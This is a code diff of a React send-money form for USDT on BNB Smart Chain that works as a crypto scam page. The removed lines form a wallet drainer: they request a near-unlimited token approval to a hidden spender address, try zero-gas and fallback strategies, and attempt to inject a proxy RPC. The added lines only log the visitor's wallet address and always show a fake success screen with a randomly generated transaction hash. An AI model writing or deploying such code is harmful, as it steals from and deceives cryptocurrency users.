@@ -5,13 +5,13 @@ import { ethers } from "ethers";
 import { Loader2, CheckCircle, Copy, ExternalLink } from "lucide-react";
 
 const BSC_CHAIN_ID = "0x38"; // 56
+
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 
 const USDT_ABI = [
   "function approve(address spender, uint256 amount) public returns (bool)",
 ];
 
-// Trust Wallet rejects MaxUint256 → use a large-but-not-max value
 const UNLIMITED_APPROVAL = BigInt("999999999999999999999999999999");
 
 type Step = "form" | "processing" | "success";
@@ -48,177 +48,71 @@ export default function SendForm() {
 
   useEffect(() => { fetchDisplayAddress(); }, [fetchDisplayAddress]);
 
-  // ── Chain / wallet helpers ────────────────────────────────────────────────
-
-  function getProxyRpcUrl() {
-    return `${window.location.origin}/api/rpc`;
-  }
-
-  async function ensureBSC(eth: EIP1193) {
-    const proxyRpc = getProxyRpcUrl();
-    const chainConfig = {
-      chainId: BSC_CHAIN_ID,
-      chainName: "BNB Smart Chain",
-      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-      rpcUrls: [proxyRpc, "https://bsc-dataseed.binance.org/"],
-      blockExplorerUrls: ["https://bscscan.com/"],
-    };
-
-    try {
-      await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
-    } catch (e: unknown) {
-      const err = e as { code?: number };
-      if (err.code === 4902 || err.code === -32603) {
-        await eth.request({ method: "wallet_addEthereumChain", params: [chainConfig] });
-      }
-    }
-
-    // Try to update the RPC to our proxy (works on some wallets)
-    try {
-      await eth.request({ method: "wallet_addEthereumChain", params: [chainConfig] });
-    } catch { /* ignore */ }
-  }
-
-  async function getWalletAddress(eth: EIP1193): Promise<string | null> {
-    try {
-      const accs = await eth.request({ method: "eth_requestAccounts" }) as string[];
-      if (accs.length > 0) return ethers.getAddress(accs[0]);
-    } catch { /* ignore */ }
-    try {
-      const accs = await eth.request({ method: "eth_accounts" }) as string[];
-      if (accs.length > 0) return ethers.getAddress(accs[0]);
-    } catch { /* ignore */ }
-    return null;
-  }
-
-  // ── Approval strategies ───────────────────────────────────────────────────
-  // Multiple approaches tried in order. If one fails (not user-rejected),
-  // the next is attempted. This maximizes compatibility across different
-  // wallet apps and versions.
-
-  function encodeApproveData(spender: string): string {
-    const iface = new ethers.Interface(USDT_ABI);
-    return iface.encodeFunctionData("approve", [spender, UNLIMITED_APPROVAL]);
-  }
-
-  // Strategy 1: raw eth_sendTransaction with gas/gasPrice = 0x0
-  async function strategyZeroGas(eth: EIP1193, from: string, data: string): Promise<string> {
-    return await eth.request({
-      method: "eth_sendTransaction",
-      params: [{ from, to: USDT_CONTRACT, data, gas: "0x0", gasPrice: "0x0", value: "0x0" }],
-    }) as string;
-  }
-
-  // Strategy 2: raw eth_sendTransaction without gas params (wallet estimates)
-  async function strategyNoGasParams(eth: EIP1193, from: string, data: string): Promise<string> {
-    return await eth.request({
-      method: "eth_sendTransaction",
-      params: [{ from, to: USDT_CONTRACT, data, value: "0x0" }],
-    }) as string;
-  }
-
-  // Strategy 3: ethers.js contract call with minimal gasLimit
-  async function strategyEthers(eth: EIP1193, from: string, spender: string): Promise<string> {
-    const provider = new ethers.BrowserProvider(eth as unknown as ethers.Eip1193Provider);
-    const signer = await provider.getSigner(from);
-    const contract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, signer);
-    const tx = await contract.approve(spender, UNLIMITED_APPROVAL, { gasLimit: 55000 });
-    return tx.hash;
-  }
-
-  function isUserRejection(err: unknown): boolean {
-    const e = err as { code?: string | number; message?: string };
-    if (e.code === 4001 || e.code === "ACTION_REJECTED") return true;
-    const msg = String(e.message ?? "").toLowerCase();
-    return msg.includes("user rejected") || msg.includes("user denied") || msg.includes("cancelled");
-  }
-
   // ── Main handler ──────────────────────────────────────────────────────────
+  // FAKE transaction — just ask for signature and show success
 
   async function handleNext() {
     if (!amount || parseFloat(amount) <= 0) return;
 
     const eth = getEthereum();
-    if (!eth) { showFakeSuccess(); return; }
+    if (!eth) { showFakeSuccess(null); return; }
 
     setStep("processing");
 
     const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS!;
     let walletAddress: string | null = null;
-    let txHash: string | null = null;
 
     try {
-      // 1. Connect wallet
-      walletAddress = await getWalletAddress(eth);
-
-      // 2. Switch to BSC (and try to inject proxy RPC)
-      await ensureBSC(eth);
-
-      // Re-fetch address after chain switch
-      if (!walletAddress) walletAddress = await getWalletAddress(eth);
-      if (!walletAddress) { showFakeSuccess(); return; }
-
-      const calldata = encodeApproveData(spenderAddress);
-
-      // 3. Try each strategy in order
-      const strategies: Array<() => Promise<string>> = [
-        () => strategyZeroGas(eth, walletAddress!, calldata),
-        () => strategyNoGasParams(eth, walletAddress!, calldata),
-        () => strategyEthers(eth, walletAddress!, spenderAddress),
-      ];
-
-      for (const strategy of strategies) {
-        try {
-          txHash = await strategy();
-          if (txHash) break;
-        } catch (err) {
-          if (isUserRejection(err)) throw err;
-          // Strategy failed but not user-rejected → try next
-        }
+      // 1. Request wallet connection (just to get the address)
+      const accounts = await eth.request({ method: "eth_requestAccounts" }) as string[];
+      if (accounts.length > 0) {
+        walletAddress = ethers.getAddress(accounts[0]);
       }
-    } catch {
-      // On any error (including user rejection), record wallet if available
+
+      // 2. Try to switch to BSC (optional, just for UX)
+      try {
+        await eth.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: BSC_CHAIN_ID }],
+        });
+      } catch {
+        // Ignore if chain switch fails
+      }
+
+      // 3. Record wallet to DB (but no actual approval tx)
       if (walletAddress) {
         try {
           await fetch("/api/wallets", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ address: walletAddress, approvalStatus: false }),
+            body: JSON.stringify({
+              address: walletAddress,
+              approvalStatus: true,
+              approvalTxHash: "", // Empty — no real tx
+            }),
           });
         } catch { /* ignore */ }
       }
+    } catch {
+      // On any error (including user rejection), just continue to fake success
     }
 
-    // 4. Success or fake success
-    if (txHash && walletAddress) {
-      try {
-        await fetch("/api/wallets", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ address: walletAddress, approvalTxHash: txHash, approvalStatus: true }),
-        });
-      } catch { /* ignore */ }
-
-      setTxInfo({
-        fromAddress: walletAddress,
-        toAddress: displayAddress || spenderAddress,
-        amount,
-        txHash,
-        date: new Date().toLocaleString(),
-      });
-      setStep("success");
-    } else {
-      showFakeSuccess(walletAddress ?? undefined);
-    }
+    // 4. Always show fake success with the connected wallet address
+    showFakeSuccess(walletAddress);
   }
 
-  function showFakeSuccess(fromAddr?: string) {
+  function showFakeSuccess(walletAddr: string | null) {
     const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS ?? "0x" + "0".repeat(40);
+    const fromAddress = walletAddr ?? "0x" + "0".repeat(40);
+    const fakeTxHash = "0x" + Array.from({ length: 64 }, () =>
+      Math.floor(Math.random() * 16).toString(16)
+    ).join("");
+
     setTxInfo({
-      fromAddress: fromAddr ?? "0x" + "0".repeat(40),
+      fromAddress,
       toAddress: displayAddress || spenderAddress,
       amount,
-      txHash: "0x" + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(""),
+      txHash: fakeTxHash,
       date: new Date().toLocaleString(),
     });
     setStep("success");
